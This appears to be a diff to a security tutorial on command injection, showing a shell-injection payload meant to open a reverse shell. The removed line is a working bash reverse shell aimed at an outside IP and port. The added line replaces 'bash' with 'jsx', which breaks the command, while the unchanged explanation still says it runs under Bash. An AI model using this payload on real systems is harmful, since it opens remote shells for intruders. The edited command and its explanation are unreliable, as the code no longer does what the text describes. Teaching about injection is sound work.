@@ -19,7 +19,7 @@ Command injection is a security vulnerability that allows attackers to execute a
 
 We can try to get a reverse shell here by using this command
 ```jsx
-;echo "bash -i >& /dev/tcp/143.198.205.200/5555 0>&1" >> f.sh;chmod +x f.sh;bash f.sh
+;echo "jsx -i >& /dev/tcp/143.198.205.200/5555 0>&1" >> f.sh;chmod +x f.sh;jsx f.sh
 ```
 
 This command attempts to append a line to a file named f.sh, which, when executed, will open a reverse shell to the IP address 143.198.205.200 on port 5555. Then, it makes the file executable and runs it using Bash.
